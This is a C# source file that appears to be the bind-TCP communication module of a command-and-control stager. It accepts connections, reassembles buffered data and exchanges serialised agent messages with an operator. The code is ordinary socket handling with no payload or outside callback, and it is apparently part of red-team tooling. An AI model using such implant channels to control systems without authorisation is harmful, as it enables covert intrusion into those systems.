using Shared.Models;
using Shared.Utilities;

using Stager.Models;

using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

namespace Stager.Comms
{
    public class TCPCommModule : CommModule
    {
        TcpListener Listener;

        ManualResetEvent Event = new ManualResetEvent(false);

        public TCPCommModule(string BindAddress, int BindPort)
        {
            Listener = new TcpListener(IPAddress.Parse(BindAddress), BindPort);
        }

        public override void Start()
        {
            try
            {
                Listener.Start();
                Status = ModuleStatus.Running;
            }
            catch
            {
                Status = ModuleStatus.Terminated;
            }
            

            Task.Factory.StartNew(delegate ()
            {
                while (Status == ModuleStatus.Running)
                {
                    Event.Reset();

                    Listener.BeginAcceptTcpClient(new AsyncCallback(AcceptCallback), Listener);

                    Event.WaitOne();

                    Thread.Sleep(1000);
                }
            });
        }

        private void AcceptCallback(IAsyncResult ar)
        {
            Event.Set();

            var listener = ar.AsyncState as TcpListener;

            if (Status == ModuleStatus.Running)
            {
                var handler = Listener.EndAcceptTcpClient(ar);
                var stream = handler.GetStream();
                var state = new CommStateObject { Worker = stream };
                stream.BeginRead(state.Buffer, 0, state.Buffer.Length, new AsyncCallback(ReadCallback), state);
            }
        }

        private void ReadCallback(IAsyncResult ar)
        {
            var state = ar.AsyncState as CommStateObject;
            var stream = state.Worker as NetworkStream;

            var bytesRead = 0;

            try
            {
                bytesRead = stream.EndRead(ar);
            }
            catch { }

            if (bytesRead > 0)
            {
                var data = DataJuggle(bytesRead, stream, state);

                var inbound = Utilities.DeserialiseData<AgentMessage>(data);

                if (inbound != null && inbound.Data != null)
                {
                    Inbound.Enqueue(inbound);
                }

            }

            var outbound = new AgentMessage();

            if (Outbound.Count > 0)
            {
                outbound = Outbound.Dequeue();
            }

            var dataToSend = Utilities.SerialiseData(outbound);

            stream.BeginWrite(dataToSend, 0, dataToSend.Length, new AsyncCallback(WriteCallback), stream);
        }

        private void WriteCallback(IAsyncResult ar)
        {
            var stream = ar.AsyncState as NetworkStream;

            stream.EndWrite(ar);
            stream.Close();
        }

        byte[] DataJuggle(int bytesRead, NetworkStream stream, CommStateObject state)
        {
            var final = new byte[] { };

            var dataReceived = state.Buffer.TrimBytes();

            if (bytesRead == state.Buffer.Length)
            {
                if (state.SwapBuffer != null)
                {
                    var tmp = state.SwapBuffer;
                    state.SwapBuffer = new byte[tmp.Length + dataReceived.Length];
                    Buffer.BlockCopy(tmp, 0, state.SwapBuffer, 0, tmp.Length);
                    Buffer.BlockCopy(dataReceived, 0, state.SwapBuffer, tmp.Length, dataReceived.Length);
                }
                else
                {
                    state.SwapBuffer = new byte[dataReceived.Length];
                    Buffer.BlockCopy(dataReceived, 0, state.SwapBuffer, 0, dataReceived.Length);
                }

                Array.Clear(state.Buffer, 0, state.Buffer.Length);
                stream.BeginRead(state.Buffer, 0, state.Buffer.Length, new AsyncCallback(ReadCallback), state);
            }
            else
            {
                if (state.SwapBuffer != null)
                {
                    final = new byte[state.SwapBuffer.Length + dataReceived.Length];
                    Buffer.BlockCopy(state.SwapBuffer, 0, final, 0, state.SwapBuffer.Length);
                    Buffer.BlockCopy(dataReceived, 0, final, state.SwapBuffer.Length, dataReceived.Length);
                }
                else
                {
                    final = new byte[dataReceived.Length];
                    Buffer.BlockCopy(dataReceived, 0, final, 0, dataReceived.Length);
                }
            }

            return final.TrimBytes();
        }

        public override void Stop()
        {
            base.Stop();
            Listener.Stop();
        }
    }
}